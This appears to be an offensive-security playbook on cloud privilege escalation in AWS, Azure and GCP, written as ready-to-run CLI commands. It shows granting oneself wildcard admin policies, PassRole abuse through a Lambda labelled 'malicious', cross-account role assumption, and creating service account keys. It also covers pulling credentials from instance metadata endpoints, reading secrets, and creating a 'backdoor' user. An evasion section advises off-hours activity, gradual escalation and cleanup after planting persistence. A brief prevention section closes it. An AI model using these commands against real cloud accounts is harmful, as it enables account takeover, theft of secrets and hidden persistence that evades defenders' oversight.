#cloud #privilege-escalation #aws #azure #gcp

Privilege escalation in cloud environments exploits IAM misconfigurations, service identity overprovisioning, and trust relationships. The goal is to move from limited permissions to administrative access.

---

## Enumeration: Finding Escalation Paths

### Step 1: Enumerate Current Permissions

**AWS:**
```bash
# What can my current principal do?
aws iam list-attached-user-policies
aws iam list-inline-user-policies
aws iam list-group-policies

# What actions do my attached policies allow?
aws iam get-user-policy --policy-name <policy-name>
aws iam get-role-policy --role-name <role-name>

# If assumed a role, what can I do with it?
aws sts get-caller-identity
```

**Azure:**
```bash
# Current principal
az ad signed-in-user show

# My role assignments
az role assignment list --assignee <user-id>

# Details of a role
az role definition show --name <role-name>
```

**GCP:**
```bash
# Current principal
gcloud auth list

# My project roles
gcloud projects get-iam-policy <project> \
  --flatten="bindings[].members" \
  --filter="bindings.members:user@example.com"
```

### Step 2: Identify Escalation Opportunities

**Can I create an access key?**
```bash
# AWS
aws iam list-user-policies | grep -i access

# If yes: Create new key for persistence
aws iam create-access-key --user-name <target-user>
```

**Can I assume a higher-privilege role?**
```bash
# AWS: Check role trust relationships
aws iam get-role --role-name <role-name>
# Look for "AssumeRolePolicyDocument"

# If I can assume it:
aws sts assume-role --role-arn arn:aws:iam::123:role/Admin
```

**Can I modify IAM policies?**
```bash
# AWS: Can I edit a policy I'm attached to?
aws iam put-user-policy
aws iam put-role-policy

# If yes: Grant myself admin access
aws iam put-user-policy --user-name <user> \
  --policy-name admin --policy-document '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

**Can I pass a role to a service I control?**
```bash
# AWS: PassRole + Lambda/EC2/etc
# If I can create a Lambda with an admin role, I can invoke it

aws lambda create-function \
  --function-name malicious \
  --role arn:aws:iam::123:role/AdminRole \
  --handler index.handler \
  --runtime python3.9 \
  --zip-file ...
```

---

## Common Escalation Vectors

### AWS: PassRole Abuse

**The Attack:**
```
Permission: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
Exploitation:
  1. Create Lambda with admin role
  2. Invoke Lambda with admin permissions
  3. Full account compromise
```

**Detection:**
```bash
# Check if I have PassRole
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123:user/me \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::123:role/AdminRole
```

### AWS: Cross-Account Role Assumption

**The Attack:**
```
Account A role can assume AdminRole in Account B
Compromise Account A → assume Account B role
```

**Exploitation:**
```bash
# Check trust relationships
aws iam get-role --role-name <role-name>

# AssumeRolePolicyDocument shows:
# "Principal": {"AWS": "arn:aws:iam::OTHER_ACCOUNT:root"}

# Assume the role
aws sts assume-role \
  --role-arn arn:aws:iam::OTHER_ACCOUNT:role/Admin \
  --role-session-name session
```

### Azure: Managed Identity Escalation

**The Attack:**
```
Managed identity attached to VM with admin role
Compromise VM → use managed identity
```

**Exploitation:**
```bash
# From compromised VM, get managed identity token
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" \
  -H "Metadata:true"

# Use token for admin API access
az account get-access-token --resource https://management.azure.com
```

### GCP: Service Account Key Theft

**The Attack:**
```
Service account with admin role
Steal service account key
Use key anywhere for full account access
```

**Exploitation:**
```bash
# If I can read service account keys
gcloud iam service-accounts keys list \
  --iam-account=service@project.iam.gserviceaccount.com

# Download key
gcloud iam service-accounts keys create key.json \
  --iam-account=service@project.iam.gserviceaccount.com

# Use it
gcloud auth activate-service-account --key-file=key.json
```

---

## Post-Enumeration: Escalation Techniques

### AWS: Privilege Escalation via IAM

**Scenario: I'm an IAM user with limited permissions**

```bash
# Step 1: Check if I can create/modify policies
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123:user/me \
  --action-names iam:PutUserPolicy \
  --resource-arns arn:aws:iam::123:user/me

# Output: If "allowed": true

# Step 2: Grant myself admin
aws iam put-user-policy \
  --user-name myuser \
  --policy-name elevation \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }'

# Step 3: Verify escalation
aws iam list-users
# Now works, confirming full access
```

### Azure: Privilege Escalation via RBAC

**Scenario: I'm a Contributor on a resource group**

```bash
# Step 1: Check if I can create role assignments
az role assignment create \
  --assignee <my-id> \
  --role "Owner" \
  --scope /subscriptions/<sub-id>/resourceGroups/<rg>

# Step 2: If successful, I'm now Owner of RG
az role assignment list --scope /subscriptions/<sub-id>/resourceGroups/<rg>

# Step 3: Create new user with owner role
az ad user create --display-name backdoor ...
```

### GCP: Privilege Escalation via IAM

**Scenario: I have Editor role on a project**

```bash
# Step 1: Check if I can modify IAM policies
gcloud projects get-iam-policy <project> --format=json

# Step 2: Add myself as Owner
gcloud projects add-iam-policy-binding <project> \
  --member=user:me@example.com \
  --role=roles/owner

# Step 3: Confirm escalation
gcloud projects get-iam-policy <project> | grep me@example.com
```

---

## Lateral Movement via Service Identities

### AWS: EC2 → S3 (via Instance Profile)

**Attack Chain:**
```
1. Compromise EC2 instance
2. Use attached IAM role (instance profile)
3. Access S3 bucket with that role's permissions
```

**Exploitation:**
```bash
# From EC2 instance
# Get temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Use credentials
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Access resources
aws s3 ls
aws secretsmanager get-secret-value --secret-id prod-db-password
```

### Azure: App Service → Key Vault (via Managed Identity)

**Attack Chain:**
```
1. Compromise app service
2. Use managed identity
3. Access Key Vault secrets
```

**Exploitation:**
```bash
# From compromised app
# Get managed identity token
TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net/" \
  -H "Metadata:true" | jq -r .access_token)

# Access Key Vault
curl -s -H "Authorization: Bearer $TOKEN" \
  https://<vault-name>.vault.azure.net/secrets/<secret-name>?api-version=2016-10-01
```

### GCP: Cloud Function → Cloud Storage (via Service Account)

**Attack Chain:**
```
1. Compromise Cloud Function
2. Use function's service account
3. Access Cloud Storage buckets
```

**Exploitation:**
```bash
# From Cloud Function
# Service account credentials available via metadata
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity \
  -H "Metadata-Flavor: Google"

# Or use gcloud (if installed)
gcloud auth application-default print-access-token

# Access resources
gsutil ls
gsutil cat gs://sensitive-bucket/secrets.txt
```

---

## Detection & Evasion

### What Gets Logged
- **AWS CloudTrail:** iam:PutUserPolicy, iam:AttachUserPolicy, sts:AssumeRole
- **Azure Activity Log:** Role assignments, IAM policy changes, authentication events
- **GCP Audit Logs:** setIamPolicy, createServiceAccount, createServiceAccountKey

### Detection Signatures
- Creating/modifying IAM policies
- Assuming roles (especially cross-account)
- Creating service account keys
- Modifying role assignments
- Sudden permission grant to low-privilege user

### Evasion
- **Timing:** Enumerate and escalate during off-hours
- **Legitimacy:** Use cloud provider CLI tools (looks normal)
- **Gradual:** Don't immediately grant yourself admin; make it look incremental
- **Delegation:** Use assumed roles instead of direct API calls
- **Cleanup:** Remove your policies/assignments after establishing persistence backdoor

---

## Prevention: Principle of Least Privilege

### AWS: Permission Boundaries
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*",
    "Condition": {
      "StringLike": {
        "iam:PermissionsBoundary": "arn:aws:iam::123:policy/MaxPermissions"
      }
    }
  }]
}
```

Prevents users from escalating beyond boundary.

### Azure: Custom RBAC Roles
Create minimal roles instead of using Owner/Contributor:
```bash
az role definition create --role-definition '{
  "Name": "CustomAppRole",
  "AssignableScopes": ["/subscriptions/<sub-id>"],
  "Permissions": [{
    "Actions": ["Microsoft.Storage/storageAccounts/read"],
    "NotActions": []
  }]
}'
```

### GCP: Custom Roles with Specific Permissions
```bash
gcloud iam roles create customRole --project=<project> \
  --title="Custom Reader" \
  --description="Read-only custom role" \
  --permissions=storage.buckets.get,storage.objects.get
```

---

## Related Guides
- [[Cloud IAM & Identity]] — understanding IAM structure
- [[Cloud Metadata Service Attacks]] — obtaining initial credentials
- [[Cloud Lateral Movement]] — moving between services post-escalation
- [[Kerberos Delegation Attacks]] — similar privilege escalation on Windows/AD
